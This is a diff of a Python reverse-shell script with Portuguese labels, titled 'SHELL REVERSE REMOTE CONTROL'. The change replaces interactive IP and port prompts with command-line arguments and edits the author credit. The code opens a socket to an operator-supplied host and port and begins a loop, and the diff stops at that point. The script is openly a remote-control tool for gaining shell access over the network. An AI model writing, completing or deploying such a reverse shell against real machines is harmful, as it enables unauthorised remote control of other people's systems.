@@ -1,20 +1,27 @@
 import socket
 import os
+import argparse
 import sys
+
+parser = argparse.ArgumentParser(description='Shell reversa em Python')
+parser.add_argument('-i','--ip', type=str, help='IP do usuario')
+parser.add_argument('-p','--port', type=int, help='Porta da aplicação')
+args = parser.parse_args()
+
 
 print("""
  _________________________________________
 |                                         |
 |                                         |
 |      SHELL REVERSE REMOTE CONTROL       |
-|            By: SSH Matheww              |
+|         By: Matheus Magalhães           |
 |                                         |
 |_________________________________________|
 """)
 
 
-HOST = str(input('Digite o IP: '))
-PORT = int(input('Digite a Porta:'))
+HOST = str(args.ip)
+PORT = int(args.port)
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST,PORT))
 while True:
